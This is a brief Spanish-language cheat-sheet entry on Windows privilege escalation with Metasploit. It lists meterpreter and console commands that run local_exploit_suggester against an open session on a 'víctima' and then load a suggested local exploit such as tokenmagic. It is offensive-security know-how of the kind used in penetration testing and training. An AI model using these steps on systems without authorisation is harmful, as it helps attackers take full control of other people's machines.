### Escalada privilegios con Metasploit
En windows, si establecemos una sesión de meterpreter con metasploit, podemos lanzar un módulo para intentar realizar la escalada de privilegios. Una vez estableceida la sesión con la víctima:

```bash
# Mandamos el proceso de la sesión al segundo plano
background

# buscamos el exploit y lo cargamos
search local_exploit_suggester

# localizamos la sesión que pusimos en segundo plano
sessions -l

# cargamos la sesión
set SESSION <numero>

# lanzar la búsqueda de exploits para la escalada de privilegios
run

# tendremos una lista de exploits, de los vulnerables, copiamos el exploit, ejemplo: /windows/local/tokenmagic

# cargar el exploit, rellenar los campos y lanzar
use /windows/local/tokenmagic

```